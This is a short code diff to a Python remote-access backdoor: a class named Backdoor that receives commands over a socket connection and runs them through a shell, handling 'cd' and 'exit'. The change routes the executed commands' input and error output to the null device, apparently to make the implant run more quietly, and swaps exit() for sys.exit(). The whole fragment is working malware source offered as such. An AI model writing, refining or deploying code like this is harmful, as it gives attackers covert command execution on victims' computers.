@@ -4,10 +4,12 @@ import socket
 import subprocess
 import json
 import base64
+import sys
 
 
 def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+    devnull = open(os.devnull, 'wb')
+    return subprocess.check_output(command, shell=True, stdin=devnull, stderr=devnull)
 
 
 def change_directory(path):
@@ -54,7 +56,7 @@ class Backdoor:
             command = self.reliable_receive()
             if command[0] == "exit":
                 self.connection.close()
-                exit()
+                sys.exit()
 
             try:
                 if command[0] == 'cd' and len(command) > 1:
